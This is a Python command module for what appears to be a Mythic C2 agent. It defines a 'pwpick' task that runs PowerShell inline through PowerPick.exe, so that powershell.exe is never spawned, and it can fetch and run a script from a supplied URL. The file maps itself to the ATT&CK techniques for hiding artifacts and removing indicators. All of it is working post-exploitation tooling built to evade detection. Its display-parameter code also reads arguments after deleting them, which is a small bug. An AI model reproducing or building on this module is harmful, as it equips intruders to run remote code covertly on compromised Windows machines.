from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json

class PwPickArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="command",
                cli_name="command",
                type=ParameterType.String,
                description="command to run",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            ),
            CommandParameter(
                name="url",
                cli_name="url",
                type=ParameterType.String,
                description="url hosting the powershell script",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
            else:
                parts = self.command_line.split()
                if len(parts) < 1:
                    raise ValueError("Usage: pwpick -command <command> [-url <url>]")
                self.add_arg("command", parts[0])
                if len(parts) > 1:
                    self.add_arg("url", parts[1])

class PwPickCommand(CommandBase):
    cmd = "pwpick"
    needs_admin = False
    help_cmd = "pwpick -command [command] [-url [script_url]]"
    description = "Run powershell command without spawning powershell.exe inline using PowerPick.exe"
    version = 1
    author = "@Oblivion"
    attackmapping = ["T1564", "T1070"]
    argument_class = PwPickArguments
    attributes = CommandAttributes(
        dependencies=["dotnet-inline"],
        supported_os=[SupportedOS.Windows],
        alias=True,
    )

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        
        task.args.add_arg("file", "kh_PowerPick.exe")
        task.args.add_arg("args", f"-c \"{task.args.get_arg('command')}\" -d \"{task.args.get_arg('url')}\"")

        task.args.remove_arg("command")
        task.args.remove_arg("url")
        
        display_params = f"-command \"{task.args.get_arg('command')}\""
        if task.args.get_arg("url"):
            display_params += f" -url \"{task.args.get_arg('url')}\""
        
        return PTTaskCreateTaskingMessageResponse(
            Success=True,
            DisplayParams=display_params,
            TaskID=task.Task.ID
        )


    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)